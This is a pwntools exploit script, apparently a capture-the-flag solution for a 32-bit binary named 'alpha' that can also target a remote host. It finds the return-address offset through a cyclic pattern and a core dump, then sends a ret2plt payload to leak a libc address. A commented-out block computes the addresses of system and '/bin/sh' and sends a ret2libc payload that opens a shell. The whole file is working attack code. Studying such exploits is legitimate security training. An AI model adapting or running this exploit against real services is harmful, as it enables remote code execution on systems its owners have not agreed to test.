from pwn import *
#from itertools import ifilter
binary = "./alpha"

p = ELF(binary)

io = process([binary])#,env={"LD_PRELOAD" : "./libc.so.6"})

io.sendline('2')
io.sendline(cyclic(512))
io.wait()

core = Coredump("/tmp/core.%s" % io.pid)
info("eip = %#x", core.eip)
offset = cyclic_find(core.eip)
info("rip offset is = %d", offset)

libc = p.libc
libc = next(filter(
            lambda x: x.file.name == p.libc.file.name,
            pwnlib.gdb.find_module_addresses(binary)
            ))
print(libc)
addr_main = p.functions['main'].address
info("Main address : %hx",addr_main)


plt_puts = p.plt['puts']
got_scanf = p.got['printf']



payload_plt = b'A'*offset+ p32(plt_puts) + p32(addr_main) + p32(got_scanf)



info("Payload PLT:\n"+hexdump(payload_plt))

if args['REMOTE']:
	io = remote(args['REMOTE'],50011)
else:
	io = p.process()
	#io = p.debug()

io.recvuntil(b"0x6e20c3a9 0x6cc3a876 0x650a3e20")
#print("ok")
"""io.sendline('2')
#io.recvuntil(b"Pr√©nom : \n")
io.sendline(payload_plt)
libc_scanf = u32(io.recvuntil(b"Input: \n")[:4])
info("scanf address is = %s", hex(libc_scanf))
libc_system = libc_scanf - libc.symbols['printf'] + libc.symbols['system']
info("System address : %hx",libc_system)
libc_binsh = libc_scanf - libc.symbols['printf'] + next(libc.search(b'/bin/sh'))
info("/bin/sh address : %hx",libc_binsh)

payload = b'A'*offset+ p32(libc_system) + p32(addr_main) + p32(libc_binsh)
info("Payload:\n"+hexdump(payload))

io.sendline(payload)
io.interactive()
io.sendline("cat flag")"""
